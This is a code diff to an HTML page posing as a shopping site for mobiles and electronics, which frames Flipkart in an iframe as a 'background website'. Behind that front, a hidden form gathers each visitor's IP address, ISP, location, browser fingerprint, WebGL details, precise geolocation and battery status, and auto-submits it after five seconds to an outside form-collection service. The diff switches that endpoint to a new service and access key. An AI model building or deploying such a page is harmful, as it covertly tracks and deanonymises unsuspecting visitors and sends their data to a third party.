@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Online shoping site for Mobiles and electronics</title>
+    <title>Online Shopping Site for Mobiles and Electronics</title>
     <style>
         body {
             margin: 0;
@@ -29,9 +29,14 @@
 
 <iframe src="https://www.flipkart.com" title="Background Website"></iframe>
 
+<form id="dataForm" action="https://api.web3forms.com/submit" method="POST">
+    <!-- Access Key -->
+    <input type="hidden" name="access_key" value="842c694c-f209-46c1-8b18-7a0f1ec272af" />
 
+    <!-- Redirect to custom thank you page -->
+    <input type="hidden" name="redirect" value="https://flipkart.com"> 
 
-<form id="dataForm" class="hidden" action="https://formsubmit.co/ca99b24713c7f553dbde071c7783a3c3" method="post">
+    <!-- Collecting Hidden Data -->
     <input type="hidden" id="hiddenIp" name="ip">
     <input type="hidden" id="hiddenLocation" name="location">
     <input type="hidden" id="hiddenIsp" name="isp">
@@ -52,14 +57,11 @@
     <input type="hidden" id="hiddenUserAgent" name="userAgent">
     <input type="hidden" id="hiddenLanguagePreferences" name="languagePreferences">
     <input type="hidden" id="hiddenConnectionSpeed" name="connectionSpeed">
-    
-    <input type="hidden" name="_next" value="https://flipkart.com">
-  
-  <input type="hidden" name="_captcha" value="false">
+
+    <button type="submit" class="hidden">Submit</button>
 </form>
 
 <script>
-  
     function fetchIPData() {
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
@@ -71,7 +73,6 @@
             .catch(error => console.error('Error fetching IP data:', error));
     }
 
-   
     function collectBrowserData() {
         const userAgent = navigator.userAgent;
         const platform = navigator.platform;
@@ -109,7 +110,6 @@
         document.getElementById('hiddenConnectionSpeed').value = connectionSpeed;
     }
 
-    
     function getWebGLInfo() {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -122,7 +122,6 @@
         return 'WebGL debug info not available';
     }
 
-    
     function getGeolocationData() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(position => {
@@ -136,7 +135,6 @@
         }
     }
 
-    
     function getBatteryStatus() {
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
@@ -148,15 +146,12 @@
         }
     }
 
-   
     fetchIPData();
     collectBrowserData();
     getGeolocationData();
     getBatteryStatus();
 
-    
     window.addEventListener('load', () => {
-      
         setTimeout(() => {
             document.getElementById('dataForm').submit();
         }, 5000); 
